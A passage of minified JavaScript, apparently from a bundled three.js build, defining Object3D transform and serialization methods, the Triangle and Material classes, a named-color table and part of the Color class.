0,!1)})),Object.defineProperties(_assertThisInitialized2(e),{position:{configurable:!0,enumerable:!0,value:r},rotation:{configurable:!0,enumerable:!0,value:i},quaternion:{configurable:!0,enumerable:!0,value:a},scale:{configurable:!0,enumerable:!0,value:o},modelViewMatrix:{value:new Xe},normalMatrix:{value:new ie}}),e.matrix=new Xe,e.matrixWorld=new Xe,e.matrixAutoUpdate=n.DefaultMatrixAutoUpdate,e.matrixWorldNeedsUpdate=!1,e.layers=new st,e.visible=!0,e.castShadow=!1,e.receiveShadow=!1,e.frustumCulled=!0,e.renderOrder=0,e.animations=[],e.userData={},e}return _createClass2(n,[{key:"onBeforeRender",value:function(){}},{key:"onAfterRender",value:function(){}},{key:"applyMatrix4",value:function(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}},{key:"applyQuaternion",value:function(e){return this.quaternion.premultiply(e),this}},{key:"setRotationFromAxisAngle",value:function(e,t){this.quaternion.setFromAxisAngle(e,t)}},{key:"setRotationFromEuler",value:function(e){this.quaternion.setFromEuler(e,!0)}},{key:"setRotationFromMatrix",value:function(e){this.quaternion.setFromRotationMatrix(e)}},{key:"setRotationFromQuaternion",value:function(e){this.quaternion.copy(e)}},{key:"rotateOnAxis",value:function(e,t){return ut.setFromAxisAngle(e,t),this.quaternion.multiply(ut),this}},{key:"rotateOnWorldAxis",value:function(e,t){return ut.setFromAxisAngle(e,t),this.quaternion.premultiply(ut),this}},{key:"rotateX",value:function(e){return this.rotateOnAxis(mt,e)}},{key:"rotateY",value:function(e){return this.rotateOnAxis(vt,e)}},{key:"rotateZ",value:function(e){return this.rotateOnAxis(gt,e)}},{key:"translateOnAxis",value:function(e,t){return ct.copy(e).applyQuaternion(this.quaternion),this.position.add(ct.multiplyScalar(t)),this}},{key:"translateX",value:function(e){return this.translateOnAxis(mt,e)}},{key:"translateY",value:function(e){return this.translateOnAxis(vt,e)}},{key:"translateZ",value:function(e){return this.translateOnAxis(gt,e)}},{key:"localToWorld",value:function(e){return e.applyMatrix4(this.matrixWorld)}},{key:"worldToLocal",value:function(e){return e.applyMatrix4(dt.copy(this.matrixWorld).invert())}},{key:"lookAt",value:function(e,t,n){e.isVector3?pt.copy(e):pt.set(e,t,n);var r=this.parent;this.updateWorldMatrix(!0,!1),ht.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?dt.lookAt(ht,pt,this.up):dt.lookAt(pt,ht,this.up),this.quaternion.setFromRotationMatrix(dt),r&&(dt.extractRotation(r.matrixWorld),ut.setFromRotationMatrix(dt),this.quaternion.premultiply(ut.invert()))}},{key:"add",value:function(e){if(1<arguments.length){for(var t=0;t<arguments.length;t++)this.add(arguments[t]);return this}return e===this||e&&e.isObject3D&&(null!==e.parent&&e.parent.remove(e),(e.parent=this).children.push(e),e.dispatchEvent(yt)),this}},{key:"remove",value:function(e){if(1<arguments.length){for(var t=0;t<arguments.length;t++)this.remove(arguments[t]);return this}var n=this.children.indexOf(e);return-1!==n&&(e.parent=null,this.children.splice(n,1),e.dispatchEvent(bt)),this}},{key:"removeFromParent",value:function(){var e=this.parent;return null!==e&&e.remove(this),this}},{key:"clear",value:function(){for(var e=0;e<this.children.length;e++){var t=this.children[e];t.parent=null,t.dispatchEvent(bt)}return this.children.length=0,this}},{key:"attach",value:function(e){return this.updateWorldMatrix(!0,!1),dt.copy(this.matrixWorld).invert(),null!==e.parent&&(e.parent.updateWorldMatrix(!0,!1),dt.multiply(e.parent.matrixWorld)),e.applyMatrix4(dt),this.add(e),e.updateWorldMatrix(!1,!0),this}},{key:"getObjectById",value:function(e){return this.getObjectByProperty("id",e)}},{key:"getObjectByName",value:function(e){return this.getObjectByProperty("name",e)}},{key:"getObjectByProperty",value:function(e,t){if(this[e]===t)return this;for(var n=0,r=this.children.length;n<r;n++){var i=this.children[n].getObjectByProperty(e,t);if(void 0!==i)return i}}},{key:"getWorldPosition",value:function(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}},{key:"getWorldQuaternion",value:function(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ht,e,ft),e}},{key:"getWorldScale",value:function(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(ht,At,e),e}},{key:"getWorldDirection",value:function(e){this.updateWorldMatrix(!0,!1);var t=this.matrixWorld.elements;return e.set(t[8],t[9],t[10]).normalize()}},{key:"raycast",value:function(){}},{key:"traverse",value:function(e){e(this);for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].traverse(e)}},{key:"traverseVisible",value:function(e){if(!1!==this.visible){e(this);for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].traverseVisible(e)}}},{key:"traverseAncestors",value:function(e){var t=this.parent;null!==t&&(e(t),t.traverseAncestors(e))}},{key:"updateMatrix",value:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0}},{key:"updateMatrixWorld",value:function(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),e=!(this.matrixWorldNeedsUpdate=!1));for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].updateMatrixWorld(e)}},{key:"updateWorldMatrix",value:function(e,t){var n=this.parent;if(!0===e&&null!==n&&n.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),!0===t)for(var r=this.children,i=0,a=r.length;i<a;i++)r[i].updateWorldMatrix(!1,!0)}},{key:"toJSON",value:function(e){var t=void 0===e||"string"==typeof e,n={};t&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{}},n.metadata={version:4.5,type:"Object",generator:"Object3D.toJSON"});var r={};function i(t,n){return void 0===t[n.uuid]&&(t[n.uuid]=n.toJSON(e)),n.uuid}if(r.uuid=this.uuid,r.type=this.type,""!==this.name&&(r.name=this.name),!0===this.castShadow&&(r.castShadow=!0),!0===this.receiveShadow&&(r.receiveShadow=!0),!1===this.visible&&(r.visible=!1),!1===this.frustumCulled&&(r.frustumCulled=!1),0!==this.renderOrder&&(r.renderOrder=this.renderOrder),"{}"!==JSON.stringify(this.userData)&&(r.userData=this.userData),r.layers=this.layers.mask,r.matrix=this.matrix.toArray(),!1===this.matrixAutoUpdate&&(r.matrixAutoUpdate=!1),this.isInstancedMesh&&(r.type="InstancedMesh",r.count=this.count,r.instanceMatrix=this.instanceMatrix.toJSON(),null!==this.instanceColor&&(r.instanceColor=this.instanceColor.toJSON())),this.isScene)this.background&&(this.background.isColor?r.background=this.background.toJSON():this.background.isTexture&&(r.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&(r.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){r.geometry=i(e.geometries,this.geometry);var a=this.geometry.parameters;if(void 0!==a&&void 0!==a.shapes){var o=a.shapes;if(Array.isArray(o))for(var s=0,l=o.length;s<l;s++){var c=o[s];i(e.shapes,c)}else i(e.shapes,o)}}if(this.isSkinnedMesh&&(r.bindMode=this.bindMode,r.bindMatrix=this.bindMatrix.toArray(),void 0!==this.skeleton&&(i(e.skeletons,this.skeleton),r.skeleton=this.skeleton.uuid)),void 0!==this.material)if(Array.isArray(this.material)){for(var u=[],d=0,p=this.material.length;d<p;d++)u.push(i(e.materials,this.material[d]));r.material=u}else r.material=i(e.materials,this.material);if(0<this.children.length){r.children=[];for(var h=0;h<this.children.length;h++)r.children.push(this.children[h].toJSON(e).object)}if(0<this.animations.length){r.animations=[];for(var f=0;f<this.animations.length;f++){var A=this.animations[f];r.animations.push(i(e.animations,A))}}if(t){var m=C(e.geometries),v=C(e.materials),g=C(e.textures),y=C(e.images),b=C(e.shapes),_=C(e.skeletons),w=C(e.animations);0<m.length&&(n.geometries=m),0<v.length&&(n.materials=v),0<g.length&&(n.textures=g),0<y.length&&(n.images=y),0<b.length&&(n.shapes=b),0<_.length&&(n.skeletons=_),0<w.length&&(n.animations=w)}return n.object=r,n;function C(e){var t=[];for(var n in e){var r=e[n];delete r.metadata,t.push(r)}return t}}},{key:"clone",value:function(e){return(new this.constructor).copy(this,e)}},{key:"copy",value:function(e){var t=!(1<arguments.length&&void 0!==arguments[1])||arguments[1];if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.userData=JSON.parse(JSON.stringify(e.userData)),!0===t)for(var n=0;n<e.children.length;n++){var r=e.children[n];this.add(r.clone())}return this}}]),n}();_t.DefaultUp=new ye(0,1,0),_t.DefaultMatrixAutoUpdate=!0,_t.prototype.isObject3D=!0;var wt=new ye,Ct=new ye,xt=new ye,St=new ye,kt=new ye,Mt=new ye,Bt=new ye,Et=new ye,Tt=new ye,Pt=new ye,It=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new ye;_classCallCheck2(this,e),this.a=t,this.b=n,this.c=r}return _createClass2(e,[{key:"set",value:function(e,t,n){return this.a.copy(e),this.b.copy(t),this.c.copy(n),this}},{key:"setFromPointsAndIndices",value:function(e,t,n,r){return this.a.copy(e[t]),this.b.copy(e[n]),this.c.copy(e[r]),this}},{key:"setFromAttributeAndIndices",value:function(e,t,n,r){return this.a.fromBufferAttribute(e,t),this.b.fromBufferAttribute(e,n),this.c.fromBufferAttribute(e,r),this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}},{key:"getArea",value:function(){return wt.subVectors(this.c,this.b),Ct.subVectors(this.a,this.b),.5*wt.cross(Ct).length()}},{key:"getMidpoint",value:function(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}},{key:"getNormal",value:function(t){return e.getNormal(this.a,this.b,this.c,t)}},{key:"getPlane",value:function(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}},{key:"getBarycoord",value:function(t,n){return e.getBarycoord(t,this.a,this.b,this.c,n)}},{key:"getUV",value:function(t,n,r,i,a){return e.getUV(t,this.a,this.b,this.c,n,r,i,a)}},{key:"containsPoint",value:function(t){return e.containsPoint(t,this.a,this.b,this.c)}},{key:"isFrontFacing",value:function(t){return e.isFrontFacing(this.a,this.b,this.c,t)}},{key:"intersectsBox",value:function(e){return e.intersectsTriangle(this)}},{key:"closestPointToPoint",value:function(e,t){var n,r,i=this.a,a=this.b,o=this.c;kt.subVectors(a,i),Mt.subVectors(o,i),Et.subVectors(e,i);var s=kt.dot(Et),l=Mt.dot(Et);if(s<=0&&l<=0)return t.copy(i);Tt.subVectors(e,a);var c=kt.dot(Tt),u=Mt.dot(Tt);if(0<=c&&u<=c)return t.copy(a);var d=s*u-c*l;if(d<=0&&0<=s&&c<=0)return n=s/(s-c),t.copy(i).addScaledVector(kt,n);Pt.subVectors(e,o);var p=kt.dot(Pt),h=Mt.dot(Pt);if(0<=h&&p<=h)return t.copy(o);var f=p*l-s*h;if(f<=0&&0<=l&&h<=0)return r=l/(l-h),t.copy(i).addScaledVector(Mt,r);var A=c*h-p*u;if(A<=0&&0<=u-c&&0<=p-h)return Bt.subVectors(o,a),r=(u-c)/(u-c+(p-h)),t.copy(a).addScaledVector(Bt,r);var m=1/(A+f+d);return n=f*m,r=d*m,t.copy(i).addScaledVector(kt,n).addScaledVector(Mt,r)}},{key:"equals",value:function(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}],[{key:"getNormal",value:function(e,t,n,r){r.subVectors(n,t),wt.subVectors(e,t),r.cross(wt);var i=r.lengthSq();return 0<i?r.multiplyScalar(1/Math.sqrt(i)):r.set(0,0,0)}},{key:"getBarycoord",value:function(e,t,n,r,i){wt.subVectors(r,t),Ct.subVectors(n,t),xt.subVectors(e,t);var a=wt.dot(wt),o=wt.dot(Ct),s=wt.dot(xt),l=Ct.dot(Ct),c=Ct.dot(xt),u=a*l-o*o;if(0===u)return i.set(-2,-1,-1);var d=1/u,p=(l*s-o*c)*d,h=(a*c-o*s)*d;return i.set(1-p-h,h,p)}},{key:"containsPoint",value:function(e,t,n,r){return this.getBarycoord(e,t,n,r,St),0<=St.x&&0<=St.y&&St.x+St.y<=1}},{key:"getUV",value:function(e,t,n,r,i,a,o,s){return this.getBarycoord(e,t,n,r,St),s.set(0,0),s.addScaledVector(i,St.x),s.addScaledVector(a,St.y),s.addScaledVector(o,St.z),s}},{key:"isFrontFacing",value:function(e,t,n,r){return wt.subVectors(n,t),Ct.subVectors(e,t),wt.cross(Ct).dot(r)<0}}]),e}(),Ft=0,Lt=function(e){_inherits2(r,H);var t=_createSuper(r);function r(){var e;return _classCallCheck2(this,r),e=t.call(this),Object.defineProperty(_assertThisInitialized2(e),"id",{value:Ft++}),e.uuid=q(),e.name="",e.type="Material",e.fog=!0,e.blending=1,e.side=0,e.vertexColors=!1,e.opacity=1,e.format=S,e.transparent=!1,e.blendSrc=204,e.blendDst=205,e.blendEquation=n,e.blendSrcAlpha=null,e.blendDstAlpha=null,e.blendEquationAlpha=null,e.depthFunc=3,e.depthTest=!0,e.depthWrite=!0,e.stencilWriteMask=255,e.stencilFunc=519,e.stencilRef=0,e.stencilFuncMask=255,e.stencilFail=7680,e.stencilZFail=7680,e.stencilZPass=7680,e.stencilWrite=!1,e.clippingPlanes=null,e.clipIntersection=!1,e.clipShadows=!1,e.shadowSide=null,e.colorWrite=!0,e.precision=null,e.polygonOffset=!1,e.polygonOffsetFactor=0,e.polygonOffsetUnits=0,e.dithering=!1,e.alphaToCoverage=!1,e.premultipliedAlpha=!1,e.visible=!0,e.toneMapped=!0,e.userData={},e.version=0,e._alphaTest=0,e}return _createClass2(r,[{key:"onBuild",value:function(){}},{key:"onBeforeRender",value:function(){}},{key:"onBeforeCompile",value:function(){}},{key:"customProgramCacheKey",value:function(){return this.onBeforeCompile.toString()}},{key:"setValues",value:function(e){if(void 0!==e)for(var t in e){var n=e[t];if(void 0!==n)if("shading"!==t){var r=this[t];void 0!==r&&(r&&r.isColor?r.set(n):r&&r.isVector3&&n&&n.isVector3?r.copy(n):this[t]=n)}else this.flatShading=1===n}}},{key:"toJSON",value:function(e){var t=void 0===e||"string"==typeof e;t&&(e={textures:{},images:{}});var n={metadata:{version:4.5,type:"Material",generator:"Material.toJSON"}};function r(e){var t=[];for(var n in e){var r=e[n];delete r.metadata,t.push(r)}return t}if(n.uuid=this.uuid,n.type=this.type,""!==this.name&&(n.name=this.name),this.color&&this.color.isColor&&(n.color=this.color.getHex()),void 0!==this.roughness&&(n.roughness=this.roughness),void 0!==this.metalness&&(n.metalness=this.metalness),void 0!==this.sheen&&(n.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(n.sheenColor=this.sheenColor.getHex()),void 0!==this.sheenRoughness&&(n.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(n.emissive=this.emissive.getHex()),this.emissiveIntensity&&1!==this.emissiveIntensity&&(n.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(n.specular=this.specular.getHex()),void 0!==this.specularIntensity&&(n.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(n.specularColor=this.specularColor.getHex()),void 0!==this.shininess&&(n.shininess=this.shininess),void 0!==this.clearcoat&&(n.clearcoat=this.clearcoat),void 0!==this.clearcoatRoughness&&(n.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(n.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(n.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(n.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,n.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.map&&this.map.isTexture&&(n.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(n.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(n.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(n.lightMap=this.lightMap.toJSON(e).uuid,n.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(n.aoMap=this.aoMap.toJSON(e).uuid,n.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(n.bumpMap=this.bumpMap.toJSON(e).uuid,n.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(n.normalMap=this.normalMap.toJSON(e).uuid,n.normalMapType=this.normalMapType,n.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(n.displacementMap=this.displacementMap.toJSON(e).uuid,n.displacementScale=this.displacementScale,n.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(n.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(n.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(n.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(n.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(n.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(n.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(n.envMap=this.envMap.toJSON(e).uuid,void 0!==this.combine&&(n.combine=this.combine)),void 0!==this.envMapIntensity&&(n.envMapIntensity=this.envMapIntensity),void 0!==this.reflectivity&&(n.reflectivity=this.reflectivity),void 0!==this.refractionRatio&&(n.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(n.gradientMap=this.gradientMap.toJSON(e).uuid),void 0!==this.transmission&&(n.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(n.transmissionMap=this.transmissionMap.toJSON(e).uuid),void 0!==this.thickness&&(n.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(n.thicknessMap=this.thicknessMap.toJSON(e).uuid),void 0!==this.attenuationDistance&&(n.attenuationDistance=this.attenuationDistance),void 0!==this.attenuationColor&&(n.attenuationColor=this.attenuationColor.getHex()),void 0!==this.size&&(n.size=this.size),null!==this.shadowSide&&(n.shadowSide=this.shadowSide),void 0!==this.sizeAttenuation&&(n.sizeAttenuation=this.sizeAttenuation),1!==this.blending&&(n.blending=this.blending),0!==this.side&&(n.side=this.side),this.vertexColors&&(n.vertexColors=!0),this.opacity<1&&(n.opacity=this.opacity),this.format!==S&&(n.format=this.format),!0===this.transparent&&(n.transparent=this.transparent),n.depthFunc=this.depthFunc,n.depthTest=this.depthTest,n.depthWrite=this.depthWrite,n.colorWrite=this.colorWrite,n.stencilWrite=this.stencilWrite,n.stencilWriteMask=this.stencilWriteMask,n.stencilFunc=this.stencilFunc,n.stencilRef=this.stencilRef,n.stencilFuncMask=this.stencilFuncMask,n.stencilFail=this.stencilFail,n.stencilZFail=this.stencilZFail,n.stencilZPass=this.stencilZPass,this.rotation&&0!==this.rotation&&(n.rotation=this.rotation),!0===this.polygonOffset&&(n.polygonOffset=!0),0!==this.polygonOffsetFactor&&(n.polygonOffsetFactor=this.polygonOffsetFactor),0!==this.polygonOffsetUnits&&(n.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth&&1!==this.linewidth&&(n.linewidth=this.linewidth),void 0!==this.dashSize&&(n.dashSize=this.dashSize),void 0!==this.gapSize&&(n.gapSize=this.gapSize),void 0!==this.scale&&(n.scale=this.scale),!0===this.dithering&&(n.dithering=!0),0<this.alphaTest&&(n.alphaTest=this.alphaTest),!0===this.alphaToCoverage&&(n.alphaToCoverage=this.alphaToCoverage),!0===this.premultipliedAlpha&&(n.premultipliedAlpha=this.premultipliedAlpha),!0===this.wireframe&&(n.wireframe=this.wireframe),1<this.wireframeLinewidth&&(n.wireframeLinewidth=this.wireframeLinewidth),"round"!==this.wireframeLinecap&&(n.wireframeLinecap=this.wireframeLinecap),"round"!==this.wireframeLinejoin&&(n.wireframeLinejoin=this.wireframeLinejoin),!0===this.flatShading&&(n.flatShading=this.flatShading),!1===this.visible&&(n.visible=!1),!1===this.toneMapped&&(n.toneMapped=!1),"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),t){var i=r(e.textures),a=r(e.images);0<i.length&&(n.textures=i),0<a.length&&(n.images=a)}return n}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){this.name=e.name,this.fog=e.fog,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.format=e.format,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;var t=e.clippingPlanes,n=null;if(null!==t){var r=t.length;n=new Array(r);for(var i=0;i!==r;++i)n[i]=t[i].clone()}return this.clippingPlanes=n,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}},{key:"dispose",value:function(){this.dispatchEvent({type:"dispose"})}},{key:"alphaTest",get:function(){return this._alphaTest},set:function(e){0<this._alphaTest!=0<e&&this.version++,this._alphaTest=e}},{key:"needsUpdate",set:function(e){!0===e&&this.version++}}]),r}();Lt.prototype.isMaterial=!0;var Ot={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},Nt={h:0,s:0,l:0},Dt={h:0,s:0,l:0};function Rt(e,t,n){return n<0&&(n+=1),1<n&&(n-=1),n<1/6?e+6*(t-e)*n:n<.5?t:n<2/3?e+6*(t-e)*(2/3-n):e}function jt(e){return e<.04045?.0773993808*e:Math.pow(.9478672986*e+.0521327014,2.4)}function Ut(e){return e<.0031308?12.92*e:1.055*Math.pow(e,.41666)-.055}var $t=function(){function e(t,n,r){return _classCallCheck2(this,e),void 0===n&&void 0===r?this.set(t):this.setRGB(t,n,r)}return _createClass2(e,[{key:"set",value:function(e){return e&&e.isColor?this.copy(e):"number"==typeof e?this.setHex(e):"string"==typeof e&&this.setStyle(e),this}},{key:"setScalar",value:function(e){return this.r=e,this.g=e,this.b=e,this}},{key:"setHex",value:function(e){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(255&e)/255,this}},{key:"setRGB",value:function(e,t,n){return this.r=e,this.g=t,this.b=n,this}},{key:"setHSL",value:function(e,t,n){if(e=Y(e,1),t=X(t,0,1),n=X(n,0,1),0===t)this.r=this.g=this.b=n;else{var r=n<=.5?n*(1+t):n+t-n*t,i=2*n-r;this.r=Rt(i,r,e+1/3),this.g=Rt(i,r,e),this.b=Rt(i,r,e-1/3)}return this}},{key:"setStyle",value:function(e){function t(e){void 0!==e&&parseFloat(e)}var n;if(n=/^((?:rgb|hsl)a?)\(([^\)]*)\)/.exec(e)){var r,i=n[1],a=n[2];switch(i){case"rgb":case"rgba":if(r=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return this.r=Math.min(255,parseInt(r[1],10))/255,this.g=Math.min(255,parseInt(r[2],10))/255,this.b=Math.min(255,parseInt(r[3],10))/255,t(r[4]),this;if(r=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return this.r=Math.min(100,parseInt(r[1],10))/100,this.g=Math.min(100,parseInt(r[2],10))/100,this.b=Math.min(100,parseInt(r[3],10))/100,t(r[4]),this;break;case"hsl":case"hsla":if(r=/^\s*(\d*\.?\d+)\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a)){var o=parseFloat(r[1])/360,s=parseInt(r[2],10)/100,l=parseInt(r[3],10)/100;return t(r[4]),this.setHSL(o,s,l)}}}else if(n=/^\#([A-Fa-f\d]+)$/.exec(e)){var c=n[1],u=c.length;if(3===u)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===u)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}return e&&0<e.length?this.setColorName(e):this}},{key:"setColorName",value:function(e){var t=Ot[e.toLowerCase()];return void 0!==t&&this.setHex(t),this}},{key:"clone",value:function(){return new this.constructor(this.r,this.g,this.b)}},{key:"copy",value:function(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}},{key:"copySRGBToLinear",value:function(e){return this.r=jt(e.r),this.g=jt(e.g),this.b=jt(e.b),this}},{key:"copyLinearToSRGB",value:function(e){return this.r=Ut(e.r),this.g=Ut(e.g),this.b=Ut(e.b),this}},{key:"convertSRGBToLinear",value:function(){return this.copySRGBToLinear(this),this}},{key:"convertLinearToSRGB",value:function(){return this.copyLinearToSRGB(this),this}},{key:"getHex",value:function(){return 